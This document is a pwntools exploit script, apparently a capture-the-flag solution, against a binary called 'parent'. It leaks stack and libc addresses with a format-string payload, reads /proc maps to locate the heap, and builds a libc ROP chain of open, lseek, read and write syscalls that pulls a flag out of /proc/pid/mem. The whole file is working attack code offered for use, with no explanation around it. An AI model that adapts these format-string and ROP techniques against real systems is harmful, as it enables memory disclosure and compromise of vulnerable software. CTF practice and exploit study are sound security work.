#!/usr/bin/python3
from pwn import *

chall = "./parent"
elf = context.binary = ELF(chall)
libc = ELF("./libc/libc.so.6")

p = elf.process(stdin=process.PTY, stdout=process.PTY)

if args.REMOTE:
    host = "127.0.0.1"
    port = 32784
    p = remote(host, port)

if args.GDB:
    p = gdb.debug(
        chall,
        gdbscript=f"""
        set follow-fork-mode child
        b *main
        b *warn_get
        b *warn_get+155
        c
    """,
    )


def appreciate():
    p.recv()
    p.sendline(b"1")
    p.recvuntil(b"You are now appreciating your ")
    return int(p.readline().split()[0].strip().decode("utf8"))


def gamble():
    p.recvuntil(b"> ")
    p.sendline(b"2")
    res = b""
    win_cond = b"YOU WON!!! (KEEP GAMBLING FOR MORE RED40)"
    while win_cond not in res:
        p.recvuntil(b"> ")
        p.sendline(b"Y")
        res = p.readline()


def steal(ppid):
    p.recv()
    p.sendline(b"5")
    p.recvuntil(b"> ")
    p.sendline(f"/proc/{ppid}/maps".encode())
    res = p.recvuntil(b"You have stolen a lot of red40...").decode()
    maps = res

    return maps


def warn():
    p.recv()
    p.sendline(b"3")


def get_base(maps, line):
    for map in maps.splitlines():
        if line in map:
            return int(map.split("-")[0], 16)


gamble()
pid = appreciate()
ppid = pid
print("PID:", pid)
proc_maps = steal(ppid)
heap_base = get_base(proc_maps, "[heap]")


# EXPLOIT
# Flag is stored at heap + 0x2A0
flag_addr = heap_base + 0x2A0
print("Flag Address:", hex(flag_addr))
warn()
p.recvuntil(b"How will you warn the RED40?")
p.readline()
p.readline()
# Stack.Libc
p.sendline(b"%10$p.%21$p")
l = p.readline().strip().decode().split(".")
sl = l[0]
sl = int(sl, 16)
ll = l[1]
ll = int(ll, 16) - 0x29D90
print("LIBC:", hex(ll))


libc.address = ll

# Gadgets
rop = ROP([libc])
pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
pop_rbx = rop.find_gadget(["pop rbx", "ret"])[0]
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
pop_rdx = rop.find_gadget(["pop rdx", "pop r12", "ret"])[0]
pop_rcx = rop.find_gadget(["pop rcx", "ret"])[0]
add_rsp_8 = rop.find_gadget(["add rsp, 8", "ret"])[0]
syscall = rop.find_gadget(["syscall", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]

# 0x132907 : mov rsi, rdx ; call rax
mov_rsi_rdx_call_rax = libc.address + 0x132907
# 0x12e8c6 : mov rdx, rax ; call qword ptr [rbx + 0x28]
mov_rdx_rax_call = libc.address + 0x12E8C6
# 0x1688e1 : mov qword ptr [rbx], rax ; pop rbx ; ret
mov_ptr_rbx_rax = libc.address + 0x1688E1
# 0xa793d : mov rdi, rsi ; call rax
mov_rdi_rsi_call = libc.address + 0xA793D

ret_ptr = sl - 0x188
str_ptr = ret_ptr + 0x8

# Final payload

payload = b""
# This is used later so we can call `mov_rdx_rax_call` and provide
str_bytes = f"/proc/{pid}/mem\0".encode()
payload += p64(add_rsp_8)
payload += str_bytes
payload += b"A" * (0x20 - len(payload))
payload += b"B" * 24
payload += p64(ret)

# print("Stack:", hex(str_ptr))

# Open /proc/pid/mem
payload += p64(pop_rax) + p64(0x2)
payload += p64(pop_rdi) + p64(str_ptr)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0) + p64(0)
payload += p64(syscall)

# Move fd from `rax` to `rdi`
payload += p64(pop_rbx) + p64(ret_ptr - 0x28)
payload += p64(mov_rdx_rax_call)
payload += p64(pop_rax) + p64(add_rsp_8)
payload += p64(mov_rsi_rdx_call_rax)
payload += p64(mov_rdi_rsi_call)

# Lseek to `flag_addr`
payload += p64(pop_rax) + p64(0x8)
payload += p64(pop_rsi) + p64(flag_addr)
payload += p64(pop_rdx) + p64(0) + p64(0)
payload += p64(syscall)

# Read
payload += p64(pop_rax) + p64(0x0)
payload += p64(pop_rsi) + p64(str_ptr)
payload += p64(pop_rdx) + p64(0x30) + p64(0)
payload += p64(syscall)

# Write
payload += p64(pop_rax) + p64(0x1)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi) + p64(str_ptr)
payload += p64(pop_rdx) + p64(0x30) + p64(0)
payload += p64(syscall)

p.sendline(payload)

p.interactive()
